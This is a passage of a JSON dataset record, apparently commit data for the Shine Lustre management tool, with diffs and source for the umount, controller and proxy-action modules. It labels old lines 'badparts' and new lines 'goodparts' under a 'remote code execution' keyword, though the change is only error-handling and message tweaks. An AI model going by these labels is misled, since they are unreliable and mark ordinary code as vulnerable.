[\"status\", status]]))\n\n        ldic.sort()\n        layout = AsciiTableLayout()\n        layout.set_show_header(True)\n        i = 0\n        layout.set_column(\"dev\", i, AsciiTableLayout.LEFT, \"device\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"nodes\", i, AsciiTableLayout.LEFT, \"node(s)\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"size\", i, AsciiTableLayout.RIGHT, \"dev size\",\n                AsciiTableLayout.CENTER)\n        if jdev_col_enabled:\n            i += 1\n            layout.set_column(\"jdev\", i, AsciiTableLayout.RIGHT, \"journal device\",\n                    AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"type\", i, AsciiTableLayout.LEFT, \"type\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"index\", i, AsciiTableLayout.RIGHT, \"index\",\n                AsciiTableLayout.CENTER)\n        if tag_col_enabled:\n            i += 1\n            layout.set_column(\"tag\", i, AsciiTableLayout.LEFT, \"tag\",\n                    AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"label\", i, AsciiTableLayout.LEFT, \"label\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"flags\", i, AsciiTableLayout.LEFT, \"ldd flags\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"fsname\", i, AsciiTableLayout.LEFT, \"fsname\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"status\", i, AsciiTableLayout.LEFT, \"status\",\n                AsciiTableLayout.CENTER)\n\n        AsciiTable().print_from_list_of_dict(ldic, layout)\n\n"}, "/lib/Shine/Commands/Umount.py": {"changes": [{"diff": "\n     def ev_stopclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Umount: %s\" % (node, client.status_info)\n+                print \"%s: Umount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully unmounted from %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Umount.py", "badparts": ["                print \"%s: Umount: %s\" % (node, client.status_info)"], "goodparts": ["                print \"%s: Umount %s: %s\" % (node, client.fs.fs_name, client.status_info)"]}, {"diff": "\n \n             if rc == RC_OK:\n                 if vlevel > 0:\n-                    print \"Unmount successful.\"\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                    print \"Unmount successful on %s\" % m_nodes\n             elif rc == RC_RUNTIME_ERROR:\n                 for nodes, msg in fs.proxy_errors:\n                     print \"%s: %s\" % (nod", "add": 2, "remove": 1, "filename": "/lib/Shine/Commands/Umount.py", "badparts": ["                    print \"Unmount successful.\""], "goodparts": ["                    print \"Unmount successful on %s\" % m_nodes"]}], "source": "\n \"\"\" Shine `umount' command classes. The umount command aims to stop Lustre filesystem clients. \"\"\" import os from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Base.FSClientLiveCommand import FSClientLiveCommand from Base.CommandRCDefs import * from Base.RemoteCallEventHandler import RemoteCallEventHandler from Shine.FSUtils import open_lustrefs import Shine.Lustre.EventHandler from Shine.Lustre.FileSystem import * class GlobalUmountEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_stopclient_start(self, node, client): if self.verbose > 1: print \"%s: Unmounting %s on %s...\" %(node, client.fs.fs_name, client.mount_path) def ev_stopclient_done(self, node, client): if self.verbose > 1: if client.status_info: print \"%s: Umount: %s\" %(node, client.status_info) else: print \"%s: FS %s succesfully unmounted from %s\" %(node, client.fs.fs_name, client.mount_path) def ev_stopclient_failed(self, node, client, rc, message): if rc: strerr=os.strerror(rc) else: strerr=message print \"%s: Failed to unmount FS %s from %s: %s\" % \\ (node, client.fs.fs_name, client.mount_path, strerr) if rc: print message class Umount(FSClientLiveCommand): \"\"\" shine umount \"\"\" def __init__(self): FSClientLiveCommand.__init__(self) def get_name(self): return \"umount\" def get_desc(self): return \"Unmount file system clients.\" target_status_rc_map={ \\ MOUNTED: RC_FAILURE, RECOVERING: RC_FAILURE, OFFLINE: RC_OK, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=0 self.init_execute() vlevel=self.verbose_support.get_verbose_level() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(None, GlobalUmountEventHandler(vlevel)) nodes=self.nodes_support.get_nodeset() fs_conf, fs=open_lustrefs(fsname, None, nodes=nodes, indexes=None, event_handler=eh) if nodes and not nodes.issubset(fs_conf.get_client_nodes()): raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\ (nodes -fs_conf.get_client_nodes(), fsname)) fs.set_debug(self.debug_support.has_debug()) status=fs.umount() rc=self.fs_status_to_rc(status) if rc > result: result=rc if rc==RC_OK: if vlevel > 0: print \"Unmount successful.\" elif rc==RC_RUNTIME_ERROR: for nodes, msg in fs.proxy_errors: print \"%s: %s\" %(nodes, msg) return result ", "sourceWithComments": "# Umount.py -- Unmount file system on clients\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `umount' command classes.\n\nThe umount command aims to stop Lustre filesystem clients.\n\"\"\"\n\nimport os\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\n# Command base class\nfrom Base.FSClientLiveCommand import FSClientLiveCommand\nfrom Base.CommandRCDefs import *\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Lustre events\nimport Shine.Lustre.EventHandler\nfrom Shine.Lustre.FileSystem import *\n\n\nclass GlobalUmountEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_stopclient_start(self, node, client):\n        if self.verbose > 1:\n            print \"%s: Unmounting %s on %s ...\" % (node, client.fs.fs_name, client.mount_path)\n\n    def ev_stopclient_done(self, node, client):\n        if self.verbose > 1:\n            if client.status_info:\n                print \"%s: Umount: %s\" % (node, client.status_info)\n            else:\n                print \"%s: FS %s succesfully unmounted from %s\" % (node,\n                        client.fs.fs_name, client.mount_path)\n\n    def ev_stopclient_failed(self, node, client, rc, message):\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"%s: Failed to unmount FS %s from %s: %s\" % \\\n                (node, client.fs.fs_name, client.mount_path, strerr)\n        if rc:\n            print message\n\n\nclass Umount(FSClientLiveCommand):\n    \"\"\"\n    shine umount\n    \"\"\"\n\n    def __init__(self):\n        FSClientLiveCommand.__init__(self)\n\n    def get_name(self):\n        return \"umount\"\n\n    def get_desc(self):\n        return \"Unmount file system clients.\"\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_FAILURE,\n            RECOVERING : RC_FAILURE,\n            OFFLINE : RC_OK,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n        result = 0\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(None,\n                    GlobalUmountEventHandler(vlevel))\n\n            nodes = self.nodes_support.get_nodeset()\n\n            fs_conf, fs = open_lustrefs(fsname, None,\n                    nodes=nodes,\n                    indexes=None,\n                    event_handler=eh)\n\n            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):\n                raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\\n                        (nodes - fs_conf.get_client_nodes(), fsname))\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            status = fs.umount()\n            rc = self.fs_status_to_rc(status)\n            if rc > result:\n                result = rc\n\n            if rc == RC_OK:\n                if vlevel > 0:\n                    print \"Unmount successful.\"\n            elif rc == RC_RUNTIME_ERROR:\n                for nodes, msg in fs.proxy_errors:\n                    print \"%s: %s\" % (nodes, msg)\n\n        return result\n\n"}, "/lib/Shine/Controller.py": {"changes": [{"diff": "\n             self.print_help(e.message, e.cmd)\n         except CommandException, e:\n             self.print_error(e.message)\n-            return RC_USER_ERROR\n         except ModelFileIOError, e:\n             print \"Error - %s\" % e.message\n         except ModelFileException, e:\n             print \"ModelFile: %s\" % e\n         except ConfigException, e:\n             print \"Configuration: %s\" % e\n-            return RC_RUNTIME_ERROR\n         # file system\n         except FSRemoteError, e:\n             self.print_error(e)\n             return e.rc\n         except NodeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except RangeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except KeyError:\n-            print \"Error - Unrecognized action\"\n-            print\n             raise\n         \n-        return 1\n+        return RC_RUNTIME", "add": 1, "remove": 7, "filename": "/lib/Shine/Controller.py", "badparts": ["            return RC_USER_ERROR", "            return RC_RUNTIME_ERROR", "            return RC_USER_ERROR", "            return RC_USER_ERROR", "            print \"Error - Unrecognized action\"", "            print", "        return 1"], "goodparts": ["        return RC_RUNTIME"]}], "source": "\n from Configuration.Globals import Globals from Commands.CommandRegistry import CommandRegistry from Configuration.ModelFile import ModelFileException from Configuration.ModelFile import ModelFileIOError from Configuration.Exceptions import ConfigException from Commands.Exceptions import * from Commands.Base.CommandRCDefs import * from Lustre.FileSystem import FSRemoteError from ClusterShell.Task import * from ClusterShell.NodeSet import * import getopt import logging import re import sys def print_csdebug(task, s): m=re.search(\"(\\w+): SHINE:\\d:(\\w+):\", s) if m: print \"%s<pickle>\" % m.group(0) else: print s class Controller: def __init__(self): self.logger=logging.getLogger(\"shine\") self.cmds=CommandRegistry() task_self().set_info(\"print_debug\", print_csdebug) def usage(self): cmd_maxlen=0 for cmd in self.cmds: if not cmd.is_hidden(): if len(cmd.get_name()) > cmd_maxlen: cmd_maxlen=len(cmd.get_name()) for cmd in self.cmds: if not cmd.is_hidden(): print \" %-*s %s\" %(cmd_maxlen, cmd.get_name(), cmd.get_params_desc()) def print_error(self, errmsg): print >>sys.stderr, \"Error:\", errmsg def print_help(self, msg, cmd): if msg: print msg print print \"Usage: %s %s\" %(cmd.get_name(), cmd.get_params_desc()) print print cmd.get_desc() def run_command(self, cmd_args): try: return self.cmds.execute(cmd_args) except getopt.GetoptError, e: print \"Syntax error: %s\" % e except CommandHelpException, e: self.print_help(e.message, e.cmd) except CommandException, e: self.print_error(e.message) return RC_USER_ERROR except ModelFileIOError, e: print \"Error -%s\" % e.message except ModelFileException, e: print \"ModelFile: %s\" % e except ConfigException, e: print \"Configuration: %s\" % e return RC_RUNTIME_ERROR except FSRemoteError, e: self.print_error(e) return e.rc except NodeSetParseError, e: self.print_error(\"%s\" % e) return RC_USER_ERROR except RangeSetParseError, e: self.print_error(\"%s\" % e) return RC_USER_ERROR except KeyError: print \"Error -Unrecognized action\" print raise return 1 ", "sourceWithComments": "# Controller.py -- Controller class\n# Copyright (C) 2007 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Configuration.Globals import Globals\nfrom Commands.CommandRegistry import CommandRegistry\n\nfrom Configuration.ModelFile import ModelFileException\nfrom Configuration.ModelFile import ModelFileIOError\n\nfrom Configuration.Exceptions import ConfigException\nfrom Commands.Exceptions import *\nfrom Commands.Base.CommandRCDefs import *\n\nfrom Lustre.FileSystem import FSRemoteError\n\nfrom ClusterShell.Task import *\nfrom ClusterShell.NodeSet import *\n\nimport getopt\nimport logging\nimport re\nimport sys\n\n\ndef print_csdebug(task, s):\n    m = re.search(\"(\\w+): SHINE:\\d:(\\w+):\", s)\n    if m:\n        print \"%s<pickle>\" % m.group(0)\n    else:\n        print s\n\n\nclass Controller:\n\n    def __init__(self):\n        self.logger = logging.getLogger(\"shine\")\n        #handler = logging.FileHandler(Globals().get_log_file())\n        #formatter = logging.Formatter('%(asctime)s %(levelname)s %(name)s : %(message)s')\n        #handler.setFormatter(formatter)\n        #self.logger.addHandler(handler)\n        #self.logger.setLevel(Globals().get_log_level())\n        self.cmds = CommandRegistry()\n\n        #task_self().set_info(\"debug\", True)\n\n        task_self().set_info(\"print_debug\", print_csdebug)\n\n    def usage(self):\n        cmd_maxlen = 0\n\n        for cmd in self.cmds:\n            if not cmd.is_hidden():\n                if len(cmd.get_name()) > cmd_maxlen:\n                    cmd_maxlen = len(cmd.get_name())\n        for cmd in self.cmds:\n            if not cmd.is_hidden():\n                print \"  %-*s %s\" % (cmd_maxlen, cmd.get_name(),\n                    cmd.get_params_desc())\n\n    def print_error(self, errmsg):\n        print >>sys.stderr, \"Error:\", errmsg\n\n    def print_help(self, msg, cmd):\n        if msg:\n            print msg\n            print\n        print \"Usage: %s %s\" % (cmd.get_name(), cmd.get_params_desc())\n        print\n        print cmd.get_desc()\n\n    def run_command(self, cmd_args):\n\n        #self.logger.info(\"running %s\" % cmd_name)\n\n        try:\n            return self.cmds.execute(cmd_args)\n        except getopt.GetoptError, e:\n            print \"Syntax error: %s\" % e\n        except CommandHelpException, e:\n            self.print_help(e.message, e.cmd)\n        except CommandException, e:\n            self.print_error(e.message)\n            return RC_USER_ERROR\n        except ModelFileIOError, e:\n            print \"Error - %s\" % e.message\n        except ModelFileException, e:\n            print \"ModelFile: %s\" % e\n        except ConfigException, e:\n            print \"Configuration: %s\" % e\n            return RC_RUNTIME_ERROR\n        # file system\n        except FSRemoteError, e:\n            self.print_error(e)\n            return e.rc\n        except NodeSetParseError, e:\n            self.print_error(\"%s\" % e)\n            return RC_USER_ERROR\n        except RangeSetParseError, e:\n            self.print_error(\"%s\" % e)\n            return RC_USER_ERROR\n        except KeyError:\n            print \"Error - Unrecognized action\"\n            print\n            raise\n        \n        return 1\n\n\n"}, "/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py": {"changes": [{"diff": "\n         \"\"\"\n         # Gather nodes by return code\n         for rc, nodes in worker.iter_retcodes():\n+            # some common remote errors:\n             # rc 127 = command not found\n             # rc 126 = found but not executable\n-            if rc >= 126:\n+            # rc 1 = python failure...\n+            if rc != 0:\n                 # Gather these nodes by buffer\n                 for buffer, nodes in worker.iter_buffers(nodes):\n                     # Handle proxy command error which rc ", "add": 3, "remove": 1, "filename": "/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py", "badparts": ["            if rc >= 126:"], "goodparts": ["            if rc != 0:"]}], "source": "\n from Shine.Configuration.Globals import Globals from Shine.Configuration.Configuration import Configuration from ProxyAction import * from ClusterShell.NodeSet import NodeSet class FSProxyAction(ProxyAction): \"\"\" Generic file system command proxy action class. \"\"\" def __init__(self, fs, action, nodes, debug, targets_type=None, targets_indexes=None): ProxyAction.__init__(self) self.fs=fs self.action=action assert isinstance(nodes, NodeSet) self.nodes=nodes self.debug=debug self.targets_type=targets_type self.targets_indexes=targets_indexes if self.fs.debug: print \"FSProxyAction %s on %s\" %(action, nodes) def launch(self): \"\"\" Launch FS proxy command. \"\"\" command=[\"%s\" % self.progpath] command.append(self.action) command.append(\"-f %s\" % self.fs.fs_name) command.append(\"-R\") if self.debug: command.append(\"-d\") if self.targets_type: command.append(\"-t %s\" % self.targets_type) if self.targets_indexes: command.append(\"-i %s\" % self.targets_indexes) self.task.shell(' '.join(command), nodes=self.nodes, handler=self) def ev_read(self, worker): node, buf=worker.last_read() try: event, params=self._shine_msg_unpack(buf) self.fs._handle_shine_event(event, node, **params) except ProxyActionUnpackError, e: pass def ev_close(self, worker): \"\"\" End of proxy command. \"\"\" for rc, nodes in worker.iter_retcodes(): if rc >=126: for buffer, nodes in worker.iter_buffers(nodes): self.fs._handle_shine_proxy_error(nodes, \"Remote action %s failed: %s\" % \\ (self.action, buffer)) self.fs.action_refcnt -=1 if self.fs.action_refcnt==0: worker.task.abort() ", "sourceWithComments": "# FSProxyAction.py -- Lustre generic FS proxy action class\n# Copyright (C) 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Shine.Configuration.Globals import Globals\nfrom Shine.Configuration.Configuration import Configuration\n\nfrom ProxyAction import *\n\nfrom ClusterShell.NodeSet import NodeSet\n\n\nclass FSProxyAction(ProxyAction):\n    \"\"\"\n    Generic file system command proxy action class.\n    \"\"\"\n\n    def __init__(self, fs, action, nodes, debug, targets_type=None, targets_indexes=None):\n        ProxyAction.__init__(self)\n        self.fs = fs\n        self.action = action\n        assert isinstance(nodes, NodeSet)\n        self.nodes = nodes\n        self.debug = debug\n        self.targets_type = targets_type\n        self.targets_indexes = targets_indexes\n\n        if self.fs.debug:\n            print \"FSProxyAction %s on %s\" % (action, nodes)\n\n    def launch(self):\n        \"\"\"\n        Launch FS proxy command.\n        \"\"\"\n        command = [\"%s\" % self.progpath]\n        command.append(self.action)\n        command.append(\"-f %s\" % self.fs.fs_name)\n        command.append(\"-R\")\n\n        if self.debug:\n            command.append(\"-d\")\n\n        if self.targets_type:\n            command.append(\"-t %s\" % self.targets_type)\n            if self.targets_indexes:\n                command.append(\"-i %s\" % self.targets_indexes)\n\n        # Schedule cluster command.\n        self.task.shell(' '.join(command), nodes=self.nodes, handler=self)\n\n    def ev_read(self, worker):\n        node, buf = worker.last_read()\n        try:\n            event, params = self._shine_msg_unpack(buf)\n            self.fs._handle_shine_event(event, node, **params)\n        except ProxyActionUnpackError, e:\n            # ignore any non shine messages\n            pass\n\n    def ev_close(self, worker):\n        \"\"\"\n        End of proxy command.\n        \"\"\"\n        # Gather nodes by return code\n        for rc, nodes in worker.iter_retcodes():\n            # rc 127 = command not found\n            # rc 126 = found but not executable\n            if rc >= 126:\n                # Gather these nodes by buffer\n                for buffer, nodes in worker.iter_buffers(nodes):\n                    # Handle proxy command error which rc >= 127 and \n                    self.fs._handle_shine_proxy_error(nodes, \"Remote action %s failed: %s\" % \\\n                            (self.action, buffer))\n\n        self.fs.action_refcnt -= 1\n        if self.fs.action_refcnt == 0:\n            worker.task.abort()\n\n"}}, "msg": "* improved proxy (remote) commands execution error handling, now checking for every error != 0 to catch every possible remote errors\n    * modified return codes when run with -R (remote call) by adding a filter for each command (rc=0 proxy success, rc!=0 proxy failure)\n    * misc. improvements on error handling and return codes handling\n* added mount/umount user messages\n\nSVN commit: r109"}}, "https://github.com/bullxpfs/lustre-shine": {"7ff203be36e439b535894764c37a8446351627ec": {"url": "https://api.github.com/repos/bullxpfs/lustre-shine/commits/7ff203be36e439b535894764c37a8446351627ec", "html_url": "https://github.com/bullxpfs/lustre-shine/commit/7ff203be36e439b535894764c37a8446351627ec", "message": "* improved proxy (remote) commands execution error handling, now checking for every error != 0 to catch every possible remote errors\n    * modified return codes when run with -R (remote call) by adding a filter for each command (rc=0 proxy success, rc!=0 proxy failure)\n    * misc. improvements on error handling and return codes handling\n* added mount/umount user messages\n\nSVN commit: r109", "sha": "7ff203be36e439b535894764c37a8446351627ec", "keyword": "remote code execution improve", "diff": "diff --git a/lib/Shine/Commands/Base/Command.py b/lib/Shine/Commands/Base/Command.py\nindex db0fa19..4b097fa 100644\n--- a/lib/Shine/Commands/Base/Command.py\n+++ b/lib/Shine/Commands/Base/Command.py\n@@ -135,3 +135,12 @@ def ask_confirm(self, prompt):\n         \"\"\"\n         i = raw_input(\"%s (y)es/(N)o: \" % prompt)\n         return i == 'y' or i == 'Y'\n+\n+\n+    def filter_rc(self, rc):\n+        \"\"\"\n+        Allow derived classes to filter return codes.\n+        \"\"\"\n+        # default is to not filter return code\n+        return rc\n+\ndiff --git a/lib/Shine/Commands/Base/RemoteCommand.py b/lib/Shine/Commands/Base/RemoteCommand.py\nindex 77de3e9..aeeea8c 100644\n--- a/lib/Shine/Commands/Base/RemoteCommand.py\n+++ b/lib/Shine/Commands/Base/RemoteCommand.py\n@@ -23,6 +23,7 @@\n from Shine.Configuration.Globals import Globals \n from Shine.Configuration.Exceptions import *\n from Command import Command\n+from CommandRCDefs import *\n from RemoteCallEventHandler import RemoteCallEventHandler\n from Support.Nodes import Nodes\n from Support.Yes import Yes\n@@ -85,6 +86,18 @@ def ask_confirm(self, prompt):\n         \"\"\"\n         return self.remote_call or Command.ask_confirm(self, prompt)\n \n+    def filter_rc(self, rc):\n+        \"\"\"\n+        When called remotely, return code are not used to handle shine action\n+        success or failure, nor for status info. To properly detect ssh or remote\n+        shine installation failures, we filter the return code here.\n+        \"\"\"\n+        if self.remote_call:\n+            # Only errors of type RUNTIME ERROR are allowed to go up.\n+            rc &= RC_FLAG_RUNTIME_ERROR\n+\n+        return Command.filter_rc(self, rc)\n+\n \n class RemoteCriticalCommand(RemoteCommand):\n \ndiff --git a/lib/Shine/Commands/CommandRegistry.py b/lib/Shine/Commands/CommandRegistry.py\nindex f1ae724..8edf6e7 100644\n--- a/lib/Shine/Commands/CommandRegistry.py\n+++ b/lib/Shine/Commands/CommandRegistry.py\n@@ -120,5 +120,8 @@ def execute(self, args):\n         command.parse(new_args)\n \n         # Execute\n-        return command.execute()\n+        rc = command.execute()\n+\n+        # Filter rc\n+        return command.filter_rc(rc)\n \ndiff --git a/lib/Shine/Commands/Install.py b/lib/Shine/Commands/Install.py\nindex 525cfc6..9bc0dd8 100644\n--- a/lib/Shine/Commands/Install.py\n+++ b/lib/Shine/Commands/Install.py\n@@ -25,9 +25,11 @@\n from Shine.FSUtils import create_lustrefs\n \n from Base.Command import Command\n+from Base.CommandRCDefs import *\n from Base.Support.LMF import LMF\n from Base.Support.Nodes import Nodes\n \n+from Exceptions import *\n \n class Install(Command):\n     \"\"\"\n@@ -48,7 +50,7 @@ def get_desc(self):\n \n     def execute(self):\n         if not self.opt_m:\n-            print \"Bad argument\"\n+            raise CommandHelpException(\"Lustre model file path (-m <model_file>) argument required.\", self)\n         else:\n             # Use this Shine.FSUtils convenience function.\n             fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),\n@@ -83,5 +85,5 @@ def execute(self):\n                 print \"Use `shine format -f %s' to initialize the file system.\" % \\\n                         fs_conf.get_fs_name()\n \n-            return 0\n+            return RC_OK\n \ndiff --git a/lib/Shine/Commands/Mount.py b/lib/Shine/Commands/Mount.py\nindex 43f3a91..d705f8f 100644\n--- a/lib/Shine/Commands/Mount.py\n+++ b/lib/Shine/Commands/Mount.py\n@@ -59,7 +59,7 @@ def ev_startclient_start(self, node, client):\n     def ev_startclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Mount: %s\" % (node, client.status_info)\n+                print \"%s: Mount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully mounted on %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n@@ -126,17 +126,26 @@ def execute(self):\n \n             fs.set_debug(self.debug_support.has_debug())\n \n+            if not self.remote_call and vlevel > 0:\n+                if nodes:\n+                    m_nodes = nodes.intersection(fs.get_client_servers())\n+                else:\n+                    m_nodes = fs.get_client_servers()\n+                print \"Starting %s clients on %s...\" % (fs.fs_name, m_nodes)\n+\n             status = fs.mount(mount_options=fs_conf.get_mount_options())\n             rc = self.fs_status_to_rc(status)\n             if rc > result:\n                 result = rc\n \n-            if rc == RC_OK:\n-                if vlevel > 0:\n-                    print \"Mount successful.\"\n-            elif rc == RC_RUNTIME_ERROR:\n-                for nodes, msg in fs.proxy_errors:\n-                    print \"%s: %s\" % (nodes, msg)\n+            if not self.remote_call:\n+                if rc == RC_OK:\n+                    if vlevel > 0:\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                        print \"Mount successful on %s\" % m_nodes\n+                elif rc == RC_RUNTIME_ERROR:\n+                    for nodes, msg in fs.proxy_errors:\n+                        print \"%s: %s\" % (nodes, msg)\n \n         return result\n \ndiff --git a/lib/Shine/Commands/Preinstall.py b/lib/Shine/Commands/Preinstall.py\nindex 304eb30..6baf18c 100644\n--- a/lib/Shine/Commands/Preinstall.py\n+++ b/lib/Shine/Commands/Preinstall.py\n@@ -26,6 +26,7 @@\n from Shine.FSUtils import create_lustrefs\n \n from Base.RemoteCommand import RemoteCommand\n+from Base.CommandRCDefs import *\n from Base.Support.FS import FS\n \n import os\n@@ -54,6 +55,7 @@ def execute(self):\n             if not os.path.exists(conf_dir_path):\n                 os.makedirs(conf_dir_path, 0755)\n         except OSError, ex:\n-            print \"OSError\"\n-            raise\n+            print \"OSError %s\" % ex\n+            return RC_RUNTIME_ERROR\n \n+        return RC_OK\ndiff --git a/lib/Shine/Commands/Start.py b/lib/Shine/Commands/Start.py\nindex e29a7e3..63c85d6 100644\n--- a/lib/Shine/Commands/Start.py\n+++ b/lib/Shine/Commands/Start.py\n@@ -214,4 +214,4 @@ def execute(self):\n             if hasattr(eh, 'post'):\n                 eh.post(fs)\n \n-            return rc\n+        return result\ndiff --git a/lib/Shine/Commands/Status.py b/lib/Shine/Commands/Status.py\nindex 055bb02..a8a5ce1 100644\n--- a/lib/Shine/Commands/Status.py\n+++ b/lib/Shine/Commands/Status.py\n@@ -121,7 +121,7 @@ def fs_status_to_rc(self, status):\n \n     def execute(self):\n \n-        result = -1\n+        result = 0\n \n         self.init_execute()\n \n@@ -158,6 +158,8 @@ def execute(self):\n                 status_flags &= ~(STATUS_SERVERS|STATUS_HASERVERS)\n \n             statusdict = fs.status(status_flags)\n+            if not statusdict:\n+                continue\n \n             if RUNTIME_ERROR in statusdict:\n                 # get targets that couldn't be checked\n@@ -176,15 +178,17 @@ def execute(self):\n             if rc > result:\n                 result = rc\n \n-            if view == \"fs\":\n-                self.status_view_fs(fs)\n-            elif view.startswith(\"target\"):\n-                self.status_view_targets(fs)\n-            elif view.startswith(\"disk\"):\n-                self.status_view_disks(fs)\n-            else:\n-                raise CommandBadParameterError(self.view_support.get_view(),\n-                        \"fs, targets, disks\")\n+            if not self.remote_call and vlevel > 0:\n+                if view == \"fs\":\n+                    self.status_view_fs(fs)\n+                elif view.startswith(\"target\"):\n+                    self.status_view_targets(fs)\n+                elif view.startswith(\"disk\"):\n+                    self.status_view_disks(fs)\n+                else:\n+                    raise CommandBadParameterError(self.view_support.get_view(),\n+                            \"fs, targets, disks\")\n+\n         return result\n \n     def status_view_targets(self, fs):\ndiff --git a/lib/Shine/Commands/Umount.py b/lib/Shine/Commands/Umount.py\nindex d7e75e8..1a6867e 100644\n--- a/lib/Shine/Commands/Umount.py\n+++ b/lib/Shine/Commands/Umount.py\n@@ -58,7 +58,7 @@ def ev_stopclient_start(self, node, client):\n     def ev_stopclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Umount: %s\" % (node, client.status_info)\n+                print \"%s: Umount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully unmounted from %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n@@ -126,6 +126,13 @@ def execute(self):\n \n             fs.set_debug(self.debug_support.has_debug())\n \n+            if not self.remote_call and vlevel > 0:\n+                if nodes:\n+                    m_nodes = nodes.intersection(fs.get_client_servers())\n+                else:\n+                    m_nodes = fs.get_client_servers()\n+                print \"Stopping %s clients on %s...\" % (fs.fs_name, m_nodes)\n+\n             status = fs.umount()\n             rc = self.fs_status_to_rc(status)\n             if rc > result:\n@@ -133,7 +140,8 @@ def execute(self):\n \n             if rc == RC_OK:\n                 if vlevel > 0:\n-                    print \"Unmount successful.\"\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                    print \"Unmount successful on %s\" % m_nodes\n             elif rc == RC_RUNTIME_ERROR:\n                 for nodes, msg in fs.proxy_errors:\n                     print \"%s: %s\" % (nodes, msg)\ndiff --git a/lib/Shine/Configuration/FileSystem.py b/lib/Shine/Configuration/FileSystem.py\nindex 022e8c1..5aa3938 100644\n--- a/lib/Shine/Configuration/FileSystem.py\n+++ b/lib/Shine/Configuration/FileSystem.py\n@@ -176,9 +176,7 @@ def 